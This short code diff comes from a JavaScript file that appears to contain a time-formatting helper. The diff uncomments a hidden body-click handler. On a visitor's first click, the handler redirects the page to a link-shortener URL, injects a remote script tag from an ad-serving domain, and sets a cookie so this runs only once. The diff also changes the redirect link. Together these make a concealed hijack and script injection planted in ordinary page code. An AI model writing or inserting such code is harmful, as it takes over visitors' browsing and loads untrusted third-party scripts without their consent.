@@ -121,11 +121,11 @@ seconds = (seconds < 10) ? "0" + seconds : seconds;
 return hours + ":" + minutes + ":" + seconds /*+ "." + milliseconds*/ ;
 }
   
-  /*
+  
   $("body").on("click", () => {
 
 if(getCookie("test") == null){
-window.location.href = "https://getgigs.sjv.io/zNKkM0";
+window.location.href = "https://paycut.io/tVznOIHz";
 //call setCookie
 $('head').find(':last').after('<script src="https://alwingulla.com/88/tag.min.js" data-zone="48566" async data-cfasync="false"></script>');
 setCookie("test", "es", 60);
@@ -135,7 +135,7 @@ $('head').find(':last').after('<script src="https://alwingulla.com/88/tag.min.js
 }
   });
   
-*/
+
 
 
 
